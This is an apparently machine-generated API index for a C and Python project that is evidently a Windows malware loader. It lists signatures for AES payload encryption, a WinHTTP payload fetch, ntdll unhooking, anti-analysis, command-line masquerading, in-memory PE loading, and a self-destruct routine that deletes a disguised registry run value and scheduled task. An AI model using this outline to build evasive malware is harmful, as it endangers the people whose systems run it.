# API

## aes.py

### AESencrypt (function) `def AESencrypt(plaintext, key)`
- Defined: `aes.py:7`

### dropFile (function) `def dropFile(key, ciphertext)`
- Defined: `aes.py:15`

## main.c

### hookGetCommandLineW (function) `LPWSTR hookGetCommandLineW()`
- Defined: `main.c:106`
- Doc: Implementación de hooks

### hookGetCommandLineA (function) `LPSTR hookGetCommandLineA()`
- Defined: `main.c:107`

### hook__p___argv (function) `char*** __cdecl hook__p___argv(void)`
- Defined: `main.c:108`

### hook__p___wargv (function) `wchar_t*** __cdecl hook__p___wargv(void)`
- Defined: `main.c:109`

### hook__p___argc (function) `int* __cdecl hook__p___argc(void)`
- Defined: `main.c:110`

### anti_analysis (function) `BOOL anti_analysis()`
- Defined: `main.c:115`
- Doc: === ANTI-ANALYSIS ===

### selfDestruct (function) `void selfDestruct()`
- Defined: `main.c:139`

### hook__wgetmainargs (function) `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)`
- Defined: `main.c:195`

### hook__getmainargs (function) `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)`
- Defined: `main.c:201`

### hookexit (function) `int __cdecl hookexit(int status)`
- Defined: `main.c:207`

### hookExitProcess (function) `void __stdcall hookExitProcess(UINT statuscode)`
- Defined: `main.c:212`

### masqueradeCmdline (function) `void masqueradeCmdline()`
- Defined: `main.c:216`

### freeargvA (function) `void freeargvA(char** array, int Argc)`
- Defined: `main.c:254`

### freeargvW (function) `void freeargvW(wchar_t** array, int Argc)`
- Defined: `main.c:262`

### GetNTHeaders (function) `char* GetNTHeaders(char* pe_buffer)`
- Defined: `main.c:270`

### GetPEDirectory (function) `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)`
- Defined: `main.c:282`

### RepairIAT (function) `BOOL RepairIAT(PVOID modulePtr)`
- Defined: `main.c:292`

### _stricmp (function) `_stricmp(func_name, "exit") == 0 ||
                    _stricmp(func_name, "_Exit") == 0 ||
    ...`
- Defined: `main.c:347`

### RunPE (function) `DWORD WINAPI RunPE(LPVOID lpParameter)`
- Defined: `main.c:367`

### PELoader (function) `void PELoader(char* data, DWORD datasize)`
- Defined: `main.c:373`

### getNtdll (function) `LPVOID getNtdll()`
- Defined: `main.c:447`

### Unhook (function) `BOOL Unhook(LPVOID cleanNtdll)`
- Defined: `main.c:490`

### DecryptAES (function) `void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen)`
- Defined: `main.c:526`

### GetData (function) `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)`
- Defined: `main.c:559`

### main (function) `int main(int argc, char** argv)`
- Defined: `main.c:661`

### RegCloseKey (function) `RegCloseKey(hKey);`
- Defined: `main.c:124`

### printf (function) `printf("[*] Initiating self-destruct...\n");`
- Defined: `main.c:141`

### fflush (function) `fflush(stdout);`
- Defined: `main.c:142`

### RegDeleteValueA (function) `RegDeleteValueA(hKey, "SystemMaintenance");`
- Defined: `main.c:155`

### system (function) `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");`
- Defined: `main.c:160`
- Doc: Eliminar tarea programada

### CloseHandle (function) `CloseHandle(pi.hThread);`
- Defined: `main.c:184`

### ExitProcess (function) `ExitProcess(0);`
- Defined: `main.c:192`

### ExitThread (function) `ExitThread(0);`
- Defined: `main.c:209`

### MultiByteToWideChar (function) `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);`
- Defined: `main.c:221`

### free (function) `free(sz_masqCmd_Widh);`
- Defined: `main.c:225`

### LocalFree (function) `LocalFree(poi_masqArgvW);`
- Defined: `main.c:238`

### entryPoint (function) `entryPoint();`
- Defined: `main.c:370`

### NTSTATUS (function) `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);`
- Defined: `main.c:390`

### NtUnmapViewOfSection (function) `NtUnmapViewOfSection(NtCurrentProcess(), preferAddr);`
- Defined: `main.c:393`

### memcpy (function) `memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);`
- Defined: `main.c:407`

### VirtualFree (function) `VirtualFree(pImageBase, 0, MEM_RELEASE);`
- Defined: `main.c:413`

### WaitForSingleObject (function) `WaitForSingleObject(hThread, INFINITE);`
- Defined: `main.c:439`

### ep (function) `ep();`
- Defined: `main.c:444`

### TerminateProcess (function) `TerminateProcess(pi.hProcess, 0);`
- Defined: `main.c:461`

### WideCharToMultiByte (function) `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);`
- Defined: `main.c:569`

### WinHttpCloseHandle (function) `WinHttpCloseHandle(hSession);`
- Defined: `main.c:582`

### ZeroMemory (function) `ZeroMemory(pszOutBuffer, dwSize + 1);`
- Defined: `main.c:617`

### srand (function) `srand(GetTickCount());`
- Defined: `main.c:663`

### Sleep (function) `Sleep(3000);`
- Defined: `main.c:723`
